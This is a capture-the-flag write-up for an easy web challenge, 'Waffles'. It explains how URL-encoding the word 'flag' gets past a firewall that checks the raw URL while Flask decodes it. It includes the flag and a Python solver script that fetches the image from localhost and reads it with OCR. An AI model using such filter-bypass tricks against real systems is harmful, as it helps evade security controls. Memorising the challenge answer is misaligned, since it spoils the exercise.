# Web - Waffles
**Author** : jvvan  
**Difficulty**: <font color='lightgreen'>Easy</font>  
**Description**: I created a gallery of my favorite waffles. Hmm, one image doesn't seem to be loading.

**Flag**: ``SCC{h0w_d1d_y0u_8yp455_my_w4ffl3_w4f?_175_m4d3_1n_ru57}``

# Writeup

The Web Application Firewall (WAF) is blocking any url that includes "flag". However, it's looking at the raw url while flask is decoding the url.
We can simply url encode the "flag" string to bypass the WAF.

Going to `/public/%66lag.jpg` will bypass the WAF and return the image.

### Automated Script

```python
SITE_URL = "http://localhost:8000"

import requests
from requests.models import PreparedRequest
from io import BytesIO
from PIL import Image
import pytesseract


class RawUrlPreparedRequest(PreparedRequest):
    def prepare_url(self, url, params):
        # Do not modify the URL
        self.url = url


def get_flag_image():
    print("Fetching flag image...")
    req = RawUrlPreparedRequest()
    req.prepare(method="GET", url=f"{SITE_URL}/public/%66lag.jpg")
    res = requests.Session().send(req)

    return res.content


def get_flag_text():
    image_data = get_flag_image()
    print("Image data fetched, processing...")
    image = Image.open(BytesIO(image_data))
    return pytesseract.image_to_string(image).strip()


print(get_flag_text())
```